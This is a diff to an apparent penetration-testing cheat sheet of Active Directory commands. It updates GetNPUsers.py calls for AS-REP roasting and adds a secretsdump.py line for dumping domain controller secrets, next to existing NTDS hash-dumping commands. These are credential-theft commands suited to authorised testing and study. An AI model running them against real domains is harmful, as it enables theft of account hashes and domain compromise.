@@ -1,10 +1,10 @@
 % asproasting, active-directory
 
 # Get user hash from users file
-GetNPUsers -no-pass -dc-ip <ip> -usersfile <usersfile> <domain>/
+GetNPUsers.py -no-pass -dc-ip <ip> -usersfile <usersfile> <domain>/
 
 # Get hash for a user
-GetNPUsers -no-pass -dc-ip <ip> <domain>/<user>
+GetNPUsers.py -no-pass -dc-ip <ip> <domain>/<user>
 
 % rpc
 
@@ -21,6 +21,9 @@ secretsdump.py -pwd-last-set -user-status -history -ntds <ntds.dit> -security SE
 
 # Get ntds.dit secrets
 secretsdump.py -hashes <ntlmhash>:<ntlmhash> '<user>'@<target>
+
+# Get all secrets a user as access from a dc
+secretsdump.py -just-dc <user>
 
 % registry
 
